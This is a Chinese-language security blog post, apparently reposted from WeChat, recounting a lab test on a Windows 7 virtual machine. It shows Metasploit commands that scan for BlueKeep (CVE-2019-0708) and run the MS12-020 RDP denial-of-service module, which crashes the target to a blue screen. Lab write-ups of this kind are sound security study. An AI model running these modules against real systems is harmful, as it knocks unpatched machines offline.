# 针对Win7远程桌面的攻击实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745143&idx=1&sn=01da9abb55b11ec6f353bea2971f2503&chksm=87148837b0630121605662d0c83fd103ef1d74541cf52e42295900a3ca94bf6765a93523b8ae&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745143&idx=1&sn=01da9abb55b11ec6f353bea2971f2503&chksm=87148837b0630121605662d0c83fd103ef1d74541cf52e42295900a3ca94bf6765a93523b8ae&scene=27#wechat_redirect)

未知攻，焉知防，一直是本博主非常崇尚的安全理念，经常读我blog的看官应该熟悉我的习惯，虽说主要业务精力都放在云计算安全方面，但遇到某种影响面比较大的漏洞，就会花时间研究其攻击效果，来证实其真实的影响力度。

本周最火的漏洞莫过于CVE-2019-0708 (BlueKeep)，针对Windows某些老系统的远程桌面，号称能做到远程执行应用程序，这威胁就相当大了，有人把它跟永恒之蓝同比，不算过分。

这么多年来，本博主练就了一身应用的本领，最遗憾的就是没有开发能力，等了一周，也没见rapid7放出来针对这个漏洞的exploit，网上看到不少号称很厉害的exploit，实践证明都是忽悠，最终等到了rapid7放出来的scanner，就迫不及待的实践了一下，

首先安装一个Win7 SP1 X64的靶机，

![](../Images/b2df3adb1b877ea1224df2ec1dd57eeb.png)

然后在ubuntu下安装metasploit做攻击机，这个简单，不再详述，

使用cve\_2019\_0708\_bluekeep，扫描看效果，

use auxiliary/scanner/rdp/cve\_2019\_0708\_bluekeep，  
show options，  
set RHOSTS 192.168.137.27，  
run，

![](../Images/e686782791e896db2cf8b867c1000ce0.png)

就告诉你这个靶机有漏洞，着实不过瘾，

偶然看了某个忽悠是这个漏洞的exploit的源码，用了另一个多年以前的攻击方法，

use auxiliary/dos/windows/rdp/ms12\_020\_maxchannelids，  
show options，  
set RHOSTS 192.168.137.27，  
run，

![](../Images/e35b98144146645fc47c80c04b647e6c.png)

攻击效果还挺不错，直接就干蓝屏了，

![](../Images/671d0039723edefddef184ae62e4da5e.png)

我相信rapid7是已经掌握CVE-2019-0708 (BlueKeep)的exploit的，做为一个良心的安全公司，不能过早的把攻击能力放开，以免黑产的成本太低，虽说仅老版本的Windows受影响，但Win7的用户量着实还是有不少的，开个远程桌面也是家常便饭。
